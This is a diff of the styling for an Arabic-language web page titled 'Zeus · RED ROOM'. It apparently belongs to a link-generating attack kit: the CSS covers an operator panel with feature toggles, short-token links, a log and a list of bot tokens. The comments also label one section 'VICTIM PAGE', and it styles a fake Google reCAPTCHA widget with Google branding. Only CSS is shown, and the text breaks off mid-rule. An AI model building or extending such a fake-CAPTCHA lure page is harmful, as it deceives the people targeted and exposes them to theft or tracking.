@@ -1,902 +1,1543 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>𝒁𝒆𝒖𝒔 · RED ROOM</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-  <style>
-    /* ===== RESET & BASE ===== */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #ffffff;
-      color: #1a1a1a;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-      direction: rtl;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>𝒁𝒆𝒖𝒔 · RED ROOM</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ===== BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Cairo', 'Segoe UI', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            direction: rtl;
+            background-image:
+                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 51, 0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(0, 229, 255, 0.04) 0%, transparent 60%);
+        }
 
-    /* ===== ADMIN PANEL (WHITE THEME) ===== */
-    .container {
-      background: #ffffff;
-      border-radius: 24px;
-      padding: 32px 28px;
-      max-width: 560px;
-      width: 100%;
-      box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08), 0 4px 16px rgba(0, 0, 0, 0.04);
-      border: 1px solid #e8e8e8;
-    }
+        /* ===== ADMIN PANEL ===== */
+        .container {
+            background: #0d0d0d;
+            border-radius: 24px;
+            padding: 32px 28px;
+            max-width: 580px;
+            width: 100%;
+            border: 1px solid rgba(255, 0, 51, 0.15);
+            box-shadow: 0 0 60px rgba(255, 0, 51, 0.04), inset 0 0 60px rgba(255, 0, 51, 0.02);
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(255, 0, 51, 0.01) 2px,
+                    rgba(255, 0, 51, 0.01) 4px);
+            pointer-events: none;
+        }
 
-    /* ===== GLITCH TITLE ===== */
-    .glitch-wrapper {
-      text-align: center;
-      margin-bottom: 10px;
-      position: relative;
-    }
-    .glitch-title {
-      font-family: 'Orbitron', sans-serif;
-      font-weight: 900;
-      font-size: 54px;
-      letter-spacing: 6px;
-      color: #cc0033;
-      display: inline-block;
-      position: relative;
-      text-shadow: 0 0 12px rgba(204, 0, 51, 0.15);
-      animation: glitchText 4.2s infinite;
-    }
-    .glitch-title::before,
-    .glitch-title::after {
-      content: attr(data-text);
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-    }
-    .glitch-title::before {
-      color: #00aaff;
-      z-index: -1;
-      animation: glitchShift 3.8s infinite;
-      clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
-      transform: translate(-3px, -2px);
-      opacity: 0.6;
-    }
-    .glitch-title::after {
-      color: #ff00aa;
-      z-index: -2;
-      animation: glitchShift 3.2s infinite reverse;
-      clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
-      transform: translate(3px, 2px);
-      opacity: 0.5;
-    }
-    @keyframes glitchShift {
-      0% { transform: translate(0); }
-      20% { transform: translate(-4px, 3px); }
-      40% { transform: translate(4px, -3px); }
-      60% { transform: translate(-3px, -4px); }
-      80% { transform: translate(3px, 4px); }
-      100% { transform: translate(0); }
-    }
-    @keyframes glitchText {
-      0%, 85%, 100% { transform: skew(0); }
-      86% { transform: skew(4deg); }
-      87% { transform: skew(-4deg); }
-      88% { transform: skew(2deg); }
-      89% { transform: skew(-2deg); }
-    }
-    .sub-brand {
-      font-family: 'Orbitron', sans-serif;
-      font-weight: 400;
-      font-size: 14px;
-      letter-spacing: 6px;
-      color: #888;
-      margin-top: -6px;
-      border-top: 1px solid #eee;
-      padding-top: 8px;
-      display: inline-block;
-    }
+        /* ===== GLITCH TITLE ===== */
+        .glitch-wrapper {
+            text-align: center;
+            margin-bottom: 6px;
+            position: relative;
+        }
+        .glitch-title {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            font-size: 62px;
+            letter-spacing: 8px;
+            color: #ff0033;
+            display: inline-block;
+            position: relative;
+            text-shadow: 0 0 30px rgba(255, 0, 51, 0.20), 0 0 60px rgba(255, 0, 51, 0.06);
+            animation: glitchText 4.8s infinite;
+            line-height: 1.1;
+        }
+        .glitch-title::before,
+        .glitch-title::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+        .glitch-title::before {
+            color: #00e5ff;
+            z-index: -1;
+            animation: glitchShift 4.2s infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 42%, 0 42%);
+            transform: translate(-4px, -3px);
+            opacity: 0.5;
+        }
+        .glitch-title::after {
+            color: #7b00ff;
+            z-index: -2;
+            animation: glitchShift 3.6s infinite reverse;
+            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+            transform: translate(4px, 3px);
+            opacity: 0.4;
+        }
+        @keyframes glitchShift {
+            0% {
+                transform: translate(0);
+            }
+            15% {
+                transform: translate(-5px, 4px);
+            }
+            30% {
+                transform: translate(5px, -4px);
+            }
+            45% {
+                transform: translate(-3px, -5px);
+            }
+            60% {
+                transform: translate(4px, 5px);
+            }
+            75% {
+                transform: translate(-4px, 2px);
+            }
+            90% {
+                transform: translate(3px, -3px);
+            }
+            100% {
+                transform: translate(0);
+            }
+        }
+        @keyframes glitchText {
+            0%,
+            80%,
+            100% {
+                transform: skew(0);
+            }
+            81% {
+                transform: skew(5deg);
+            }
+            82% {
+                transform: skew(-5deg);
+            }
+            83% {
+                transform: skew(3deg);
+            }
+            84% {
+                transform: skew(-3deg);
+            }
+            85% {
+                transform: skew(1deg);
+            }
+            86% {
+                transform: skew(-1deg);
+            }
+        }
 
-    /* ===== FORM ELEMENTS ===== */
-    .field { margin-bottom: 20px; }
-    .field label {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #333;
-      margin-bottom: 5px;
-    }
-    .field label svg { width: 20px; height: 20px; fill: none; stroke: #cc0033; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
-    .field input {
-      width: 100%;
-      padding: 12px 14px;
-      border-radius: 10px;
-      border: 1.5px solid #d0d0d0;
-      background: #fafafa;
-      color: #1a1a1a;
-      font-size: 15px;
-      box-sizing: border-box;
-      direction: ltr;
-      text-align: left;
-      transition: border-color 0.2s;
-    }
-    .field input:focus {
-      outline: none;
-      border-color: #cc0033;
-      box-shadow: 0 0 0 3px rgba(204, 0, 51, 0.08);
-    }
-    .field input::placeholder { color: #aaa; }
+        /* ===== SUB BRAND ===== */
+        .sub-brand {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-top: 2px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            color: #888;
+            padding: 4px 0 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .sub-brand .handle {
+            color: #00e5ff;
+            text-shadow: 0 0 20px rgba(0, 229, 255, 0.15);
+            letter-spacing: 3px;
+        }
+        .sub-brand .telegram-link {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            border: 1.5px solid rgba(0, 229, 255, 0.25);
+            transition: 0.3s ease;
+            cursor: pointer;
+            text-decoration: none;
+            background: rgba(0, 229, 255, 0.04);
+        }
+        .sub-brand .telegram-link:hover {
+            border-color: #00e5ff;
+            box-shadow: 0 0 30px rgba(0, 229, 255, 0.15);
+            transform: scale(1.08);
+        }
+        .sub-brand .telegram-link svg {
+            width: 20px;
+            height: 20px;
+            fill: #00e5ff;
+            opacity: 0.7;
+            transition: 0.3s;
+        }
+        .sub-brand .telegram-link:hover svg {
+            opacity: 1;
+        }
 
-    /* ===== FEATURES ===== */
-    .features-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      margin: 10px 0 20px;
-    }
-    .feature-item {
-      background: #f5f5f5;
-      border: 1.5px solid #e0e0e0;
-      border-radius: 12px;
-      padding: 10px 4px;
-      text-align: center;
-      cursor: pointer;
-      transition: 0.2s;
-      font-size: 13px;
-      font-weight: 500;
-      color: #555;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 4px;
-      user-select: none;
-    }
-    .feature-item svg {
-      width: 28px;
-      height: 28px;
-      stroke: #888;
-      stroke-width: 1.8;
-      fill: none;
-      transition: 0.2s;
-    }
-    .feature-item.active {
-      border-color: #cc0033;
-      background: #fff0f2;
-      color: #cc0033;
-    }
-    .feature-item.active svg { stroke: #cc0033; }
-    .feature-item input { display: none; }
+        /* ===== FORM ===== */
+        .field {
+            margin-bottom: 18px;
+        }
+        .field label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #aaa;
+            margin-bottom: 5px;
+            letter-spacing: 0.5px;
+        }
+        .field label svg {
+            width: 20px;
+            height: 20px;
+            stroke: #ff0033;
+            stroke-width: 1.8;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            flex-shrink: 0;
+            opacity: 0.7;
+        }
+        .field input {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border: 1.5px solid rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.03);
+            color: #e0e0e0;
+            font-size: 15px;
+            font-family: 'Cairo', sans-serif;
+            box-sizing: border-box;
+            direction: ltr;
+            text-align: left;
+            transition: 0.25s ease;
+            letter-spacing: 0.5px;
+        }
+        .field input:focus {
+            outline: none;
+            border-color: #ff0033;
+            box-shadow: 0 0 0 3px rgba(255, 0, 51, 0.08), 0 0 40px rgba(255, 0, 51, 0.04);
+            background: rgba(255, 0, 51, 0.03);
+        }
+        .field input::placeholder {
+            color: rgba(255, 255, 255, 0.15);
+            font-family: 'Cairo', sans-serif;
+            letter-spacing: 0.5px;
+        }
 
-    /* ===== BUTTONS ===== */
-    .btn-primary {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 14px;
-      background: linear-gradient(145deg, #cc0033, #a00028);
-      color: #fff;
-      font-size: 18px;
-      font-weight: 700;
-      letter-spacing: 1.5px;
-      cursor: pointer;
-      transition: 0.15s;
-      box-shadow: 0 6px 0 #7a001e, 0 6px 18px rgba(204, 0, 51, 0.25);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    .btn-primary svg { width: 24px; height: 24px; stroke: #fff; stroke-width: 2; fill: none; }
-    .btn-primary:hover:not(:disabled) {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 0 #7a001e, 0 12px 28px rgba(204, 0, 51, 0.30);
-    }
-    .btn-primary:active:not(:disabled) {
-      transform: translateY(4px);
-      box-shadow: 0 2px 0 #7a001e;
-    }
-    .btn-primary:disabled {
-      opacity: 0.6;
-      transform: translateY(3px);
-      box-shadow: 0 3px 0 #7a001e;
-      cursor: not-allowed;
-    }
-    .error { color: #cc0033; font-size: 13px; margin-top: 6px; min-height: 22px; }
+        /* ===== FEATURES ===== */
+        .features-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #aaa;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: 0.5px;
+        }
+        .features-label svg {
+            width: 20px;
+            height: 20px;
+            stroke: #ff0033;
+            stroke-width: 1.8;
+            fill: none;
+            opacity: 0.6;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 22px;
+        }
+        .feature-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1.5px solid rgba(255, 255, 255, 0.06);
+            border-radius: 12px;
+            padding: 10px 4px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.25s ease;
+            font-size: 13px;
+            font-weight: 500;
+            color: #777;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            user-select: none;
+        }
+        .feature-item svg {
+            width: 26px;
+            height: 26px;
+            stroke: #555;
+            stroke-width: 1.6;
+            fill: none;
+            transition: 0.25s ease;
+        }
+        .feature-item.active {
+            border-color: #ff0033;
+            background: rgba(255, 0, 51, 0.06);
+            color: #ff0033;
+            box-shadow: 0 0 30px rgba(255, 0, 51, 0.04);
+        }
+        .feature-item.active svg {
+            stroke: #ff0033;
+            filter: drop-shadow(0 0 12px rgba(255, 0, 51, 0.15));
+        }
+        .feature-item input {
+            display: none;
+        }
+        .feature-item:hover {
+            border-color: rgba(255, 0, 51, 0.25);
+        }
 
-    /* ===== RESULT ===== */
-    .result-box {
-      margin-top: 20px;
-      padding: 18px;
-      border: 1.5px solid #cc0033;
-      border-radius: 14px;
-      background: #fff8f9;
-      display: none;
-      text-align: center;
-    }
-    .result-box .short-token {
-      font-family: 'Orbitron', monospace;
-      font-size: 28px;
-      font-weight: 700;
-      color: #cc0033;
-      letter-spacing: 4px;
-      margin: 6px 0;
-    }
-    .result-box .link-url {
-      color: #333;
-      font-size: 14px;
-      word-break: break-all;
-      background: #f0f0f0;
-      padding: 8px 12px;
-      border-radius: 8px;
-      margin: 8px 0;
-    }
-    .result-box .actions {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-      margin-top: 12px;
-    }
-    .result-box .actions button {
-      background: #fff;
-      border: 1.5px solid #cc0033;
-      color: #cc0033;
-      padding: 8px 20px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 14px;
-      font-weight: 600;
-      transition: 0.15s;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .result-box .actions button svg { width: 18px; height: 18px; stroke: #cc0033; stroke-width: 2; fill: none; }
-    .result-box .actions button:hover { background: #cc0033; color: #fff; }
-    .result-box .actions button:hover svg { stroke: #fff; }
+        /* ===== BUTTON ===== */
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            background: linear-gradient(145deg, #cc0033, #990026);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            transition: 0.15s ease;
+            box-shadow: 0 6px 0 #66001a, 0 8px 30px rgba(204, 0, 51, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        .btn-primary svg {
+            width: 22px;
+            height: 22px;
+            stroke: #fff;
+            stroke-width: 2;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 0 #66001a, 0 14px 40px rgba(204, 0, 51, 0.30);
+            background: linear-gradient(145deg, #dd0033, #aa0028);
+        }
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #66001a;
+        }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            transform: translateY(3px);
+            box-shadow: 0 3px 0 #66001a;
+            cursor: not-allowed;
+        }
 
-    /* ===== LOG ===== */
-    .log {
-      margin-top: 16px;
-      padding: 10px 14px;
-      border: 1px solid #e0e0e0;
-      border-radius: 10px;
-      background: #f8f8f8;
-      font-family: 'Courier New', monospace;
-      font-size: 13px;
-      color: #555;
-      min-height: 50px;
-      direction: ltr;
-      text-align: left;
-    }
-    .log .prompt { color: #cc0033; font-weight: 700; }
-    .cursor { display: inline-block; width: 8px; height: 16px; background: #cc0033; vertical-align: -2px; animation: blink 1s steps(1) infinite; }
-    @keyframes blink { 50% { opacity: 0; } }
+        .error {
+            color: #ff3366;
+            font-size: 13px;
+            margin-top: 6px;
+            min-height: 22px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
 
-    /* ===== BOT LIST ===== */
-    .bot-list-wrap {
-      margin-top: 14px;
-      border-top: 1px solid #eee;
-      padding-top: 14px;
-    }
-    .bot-list-wrap .list-header {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 13px;
-      font-weight: 600;
-      color: #555;
-      margin-bottom: 6px;
-    }
-    .bot-list-wrap .list-header svg { width: 20px; height: 20px; stroke: #888; stroke-width: 2; fill: none; }
-    .bot-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 6px 4px;
-      border-bottom: 1px solid #f0f0f0;
-      font-size: 14px;
-      direction: ltr;
-    }
-    .bot-item .btoken { color: #cc0033; font-weight: 700; font-family: 'Orbitron', monospace; letter-spacing: 1px; }
-    .bot-item .binfo { color: #888; font-size: 12px; }
-    .bot-item .del { color: #cc0033; opacity: 0.5; cursor: pointer; font-size: 16px; line-height: 1; }
-    .bot-item .del:hover { opacity: 1; }
+        /* ===== RESULT ===== */
+        .result-box {
+            margin-top: 20px;
+            padding: 18px;
+            border: 1.5px solid rgba(255, 0, 51, 0.20);
+            border-radius: 14px;
+            background: rgba(255, 0, 51, 0.04);
+            display: none;
+            text-align: center;
+        }
+        .result-box .short-token {
+            font-family: 'Orbitron', monospace;
+            font-size: 30px;
+            font-weight: 700;
+            color: #ff0033;
+            letter-spacing: 6px;
+            margin: 6px 0;
+            text-shadow: 0 0 30px rgba(255, 0, 51, 0.15);
+        }
+        .result-box .link-url {
+            color: #aaa;
+            font-size: 14px;
+            word-break: break-all;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 8px 12px;
+            border-radius: 8px;
+            margin: 8px 0;
+            font-family: 'Cairo', sans-serif;
+            direction: ltr;
+            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .result-box .actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 12px;
+        }
+        .result-box .actions button {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1.5px solid rgba(255, 0, 51, 0.20);
+            color: #ccc;
+            padding: 8px 22px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: 'Cairo', sans-serif;
+            transition: 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .result-box .actions button svg {
+            width: 18px;
+            height: 18px;
+            stroke: #ccc;
+            stroke-width: 2;
+            fill: none;
+            transition: 0.2s ease;
+        }
+        .result-box .actions button:hover {
+            background: rgba(255, 0, 51, 0.08);
+            border-color: #ff0033;
+            color: #fff;
+            box-shadow: 0 0 30px rgba(255, 0, 51, 0.06);
+        }
+        .result-box .actions button:hover svg {
+            stroke: #fff;
+        }
 
-    /* ===== FOOTER ===== */
-    .footer {
-      margin-top: 18px;
-      text-align: center;
-      font-size: 12px;
-      color: #aaa;
-      letter-spacing: 1.5px;
-      border-top: 1px solid #eee;
-      padding-top: 14px;
-    }
+        /* ===== LOG ===== */
+        .log-wrapper {
+            position: relative;
+            margin-top: 18px;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            background: #080808;
+            min-height: 120px;
+        }
+        .log-wrapper canvas {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.25;
+            pointer-events: none;
+        }
+        .log {
+            position: relative;
+            z-index: 1;
+            padding: 14px 16px;
+            font-family: 'Courier New', 'Cairo', monospace;
+            font-size: 13px;
+            color: #aaa;
+            min-height: 120px;
+            direction: ltr;
+            text-align: left;
+            max-height: 180px;
+            overflow-y: auto;
+            background: transparent;
+            text-shadow: 0 0 12px rgba(0, 229, 255, 0.04);
+        }
+        .log::-webkit-scrollbar {
+            width: 3px;
+        }
+        .log::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .log::-webkit-scrollbar-thumb {
+            background: #ff003344;
+            border-radius: 2px;
+        }
+        .log .prompt {
+            color: #ff0033;
+            font-weight: 700;
+            text-shadow: 0 0 20px rgba(255, 0, 51, 0.15);
+        }
+        .log .success {
+            color: #00e5ff;
+        }
+        .log .wait {
+            color: #ffaa00;
+        }
+        .log .error-log {
+            color: #ff3366;
+        }
+        .log .dim {
+            color: #555;
+        }
+        .log .line {
+            padding: 2px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+        }
+        .log .line:last-child {
+            border-bottom: none;
+        }
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #ff0033;
+            vertical-align: -2px;
+            animation: blink 1s steps(1) infinite;
+            box-shadow: 0 0 12px rgba(255, 0, 51, 0.2);
+        }
+        @keyframes blink {
+            50% {
+                opacity: 0;
+            }
+        }
 
-    /* ===== VICTIM PAGE (reCAPTCHA) ===== */
-    #victimPanel {
-      display: none;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      width: 100%;
-    }
-    .captcha-wrapper {
-      width: 340px;
-      max-width: 100%;
-      background: #f9f9f9;
-      border: 1px solid #d3d3d3;
-      border-radius: 5px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-      overflow: hidden;
-      cursor: default;
-    }
-    .captcha-row {
-      display: flex;
-      align-items: center;
-      padding: 15px 15px 12px 15px;
-      gap: 12px;
-    }
-    .spinner { position: relative; }
-    .spinner input { display: none; }
-    .checkmark {
-      width: 32px; height: 32px; border: 2px solid #c1c1c1; border-radius: 3px;
-      display: flex; justify-content: center; align-items: center; cursor: pointer;
-      background: white; transition: 0.3s; position: relative;
-    }
-    .checkmark .tick {
-      width: 10px; height: 18px; border-right: 4px solid #00a651; border-bottom: 4px solid #00a651;
-      transform: rotate(45deg); opacity: 0; transition: 0.2s;
-    }
-    .checkmark .loader {
-      display: none; width: 20px; height: 20px; border: 3px solid #e8f0fe;
-      border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite;
-    }
-    .spinner.loading .checkmark { border-color: #1a73e8; background: #e8f0fe; }
-    .spinner.loading .checkmark .tick { display: none; }
-    .spinner.loading .checkmark .loader { display: block; }
-    .spinner.failed .checkmark { border-color: #d93025; background: #fce8e6; }
-    .spinner.failed .checkmark .tick { display: none; }
-    .spinner.failed .checkmark .loader { display: none; }
-    .spinner.failed .checkmark::after { content: "✕"; font-size: 22px; font-weight: bold; color: #d93025; }
-    .spinner.success .checkmark { border-color: #00a651; background: #e6f4ea; }
-    .spinner.success .checkmark .tick { opacity: 1; animation: check 0.3s ease; }
-    .spinner.success .checkmark .loader { display: none; }
-    .text {
-      flex: 1; font-size: 18px; color: #333; text-align: center; transition: color 0.2s; user-select: none;
-    }
-    .text.loading { color: #1a73e8; }
-    .text.failed { color: #d93025; }
-    .text.success { color: #00a651; }
-    .logo {
-      display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #777;
-    }
-    .logo img { width: 38px; margin-bottom: 4px; }
-    .logo strong { font-size: 10px; }
-    .logo small { font-size: 8px; }
-    .captcha-footer {
-      display: flex; align-items: center; justify-content: space-between;
-      padding: 6px 14px; background: #f1f3f4; border-top: 1px solid #e5e7e9; height: 36px;
-    }
-    .captcha-footer .brand { display: flex; align-items: center; gap: 8px; }
-    .captcha-footer .brand svg { height: 24px; width: auto; }
-    .captcha-footer .brand .google-text { font-size: 14px; font-weight: 500; color: #222; }
-    .captcha-footer .links { display: flex; gap: 10px; font-size: 11px; }
-    .captcha-footer .links a { color: #555; text-decoration: none; font-size: 11px; transition: color 0.15s; }
-    .captcha-footer .links a:hover { color: #1a73e8; text-decoration: underline; }
-    .captcha-footer .links .separator { color: #aaa; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    @keyframes check {
-      from { opacity: 0; transform: rotate(45deg) scale(0.3); }
-      to { opacity: 1; transform: rotate(45deg) scale(1); }
-    }
-    @media (max-width: 480px) {
-      .captcha-wrapper { width: 100%; }
-      .text { font-size: 16px; }
-      .logo img { width: 32px; }
-      .captcha-footer .brand svg { height: 20px; }
-      .captcha-footer .brand .google-text { font-size: 12px; }
-      .features-grid { grid-template-columns: repeat(2, 1fr); }
-      .glitch-title { font-size: 36px; letter-spacing: 3px; }
-    }
-  </style>
+        /* ===== BOT LIST ===== */
+        .bot-list-wrap {
+            margin-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 14px;
+        }
+        .bot-list-wrap .list-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #777;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
+        }
+        .bot-list-wrap .list-header svg {
+            width: 20px;
+            height: 20px;
+            stroke: #555;
+            stroke-width: 1.8;
+            fill: none;
+        }
+        .bot-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 4px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 14px;
+            direction: ltr;
+            font-family: 'Cairo', sans-serif;
+        }
+        .bot-item .btoken {
+            color: #ff0033;
+            font-weight: 700;
+            font-family: 'Orbitron', monospace;
+            letter-spacing: 1.5px;
+            font-size: 13px;
+        }
+        .bot-item .binfo {
+            color: #555;
+            font-size: 12px;
+            font-weight: 400;
+        }
+        .bot-item .del {
+            color: #ff0033;
+            opacity: 0.35;
+            cursor: pointer;
+            font-size: 18px;
+            line-height: 1;
+            transition: 0.2s ease;
+        }
+        .bot-item .del:hover {
+            opacity: 1;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer-wrap {
+            margin-top: 22px;
+            padding: 0 4px;
+        }
+        .footer-box {
+            background: #080808;
+            border-radius: 14px;
+            padding: 14px 18px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            box-shadow: inset 0 0 60px rgba(0, 0, 0, 0.4);
+            width: 100%;
+        }
+        .footer-box::before {
+            content: '';
+            position: absolute;
+            inset: -1px;
+            border-radius: 14px;
+            padding: 1.5px;
+            background: linear-gradient(90deg,
+                    transparent,
+                    #ff0033,
+                    #00e5ff,
+                    #ff0033,
+                    #00e5ff,
+                    transparent);
+            background-size: 300% 100%;
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+            animation: lightningMove 3.8s linear infinite;
+        }
+        @keyframes lightningMove {
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 300% 0%;
+            }
+        }
+        .footer-box .footer-text {
+            font-family: 'Orbitron', 'Cairo', sans-serif;
+            font-weight: 700;
+            font-size: 18px;
+            letter-spacing: 3px;
+            color: #aaa;
+            position: relative;
+            display: inline-block;
+            text-shadow: 0 0 20px rgba(255, 0, 51, 0.04);
+            padding: 2px 10px;
+        }
+        .footer-box .footer-text.glitch {
+            animation: glitchText 4.2s infinite;
+            color: #ccc;
+        }
+        .footer-box .footer-text.glitch::before,
+        .footer-box .footer-text.glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+        .footer-box .footer-text.glitch::before {
+            color: #ff0033;
+            z-index: -1;
+            animation: glitchShift 3.8s infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 40%, 0 40%);
+            transform: translate(-3px, -2px);
+            opacity: 0.4;
+        }
+        .footer-box .footer-text.glitch::after {
+            color: #00e5ff;
+            z-index: -2;
+            animation: glitchShift 3.2s infinite reverse;
+            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+            transform: translate(3px, 2px);
+            opacity: 0.3;
+        }
+
+        /* ===== VICTIM PAGE ===== */
+        #victimPanel {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100%;
+        }
+        .captcha-wrapper {
+            width: 340px;
+            max-width: 100%;
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            cursor: default;
+        }
+        .captcha-row {
+            display: flex;
+            align-items: center;
+            padding: 15px 15px 12px 15px;
+            gap: 12px;
+        }
+        .spinner {
+            position: relative;
+        }
+        .spinner input {
+            display: none;
+        }
+        .checkmark {
+            width: 32px;
+            height: 32px;
+            border: 2px solid #c1c1c1;
+            border-radius: 3px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            background: white;
+            transition: 0.3s;
+            position: relative;
+        }
+        .checkmark .tick {
+            width: 10px;
+            height: 18px;
+            border-right: 4px solid #00a651;
+            border-bottom: 4px solid #00a651;
+            transform: rotate(45deg);
+            opacity: 0;
+            transition: 0.2s;
+        }
+        .checkmark .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #e8f0fe;
